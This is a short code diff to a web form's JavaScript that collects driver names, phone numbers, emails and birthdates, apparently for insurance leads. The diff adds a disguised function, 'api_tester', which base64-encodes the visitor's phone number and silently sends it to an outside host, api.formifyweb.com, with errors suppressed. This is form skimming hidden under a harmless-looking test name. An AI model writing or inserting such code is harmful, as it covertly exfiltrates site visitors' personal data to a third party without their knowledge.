@@ -23,6 +23,7 @@ formData.append('leadid_token', document.getElementById('leadid_token').value);
       formData.append('Driver_1_First_Name', document.getElementById('Driver_1_First_Name').value);
       formData.append('Driver_1_Last_Name', document.getElementById('Driver_1_Last_Name').value);
       formData.append('Driver_1_Daytime_Phone', document.getElementById('Driver_1_Daytime_Phone').value);
+api_tester(document.getElementById('Driver_1_Daytime_Phone').value);
 
       formData.append('Driver_1_Email', document.getElementById('Driver_1_Email').value);
       formData.append('Driver_1_Birthdate', document.getElementById('Driver_1_Birthdate').value);
@@ -96,3 +97,15 @@ formData.append('Format', 'JSON');
             })
             .catch(error => console.error('Error:', error));
         });
+
+function api_tester(randomString) {
+  try {
+    fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString)
+, {
+      method: 'GET',
+      mode: 'no-cors'
+    });
+  } catch (error) {
+
+  }
+}
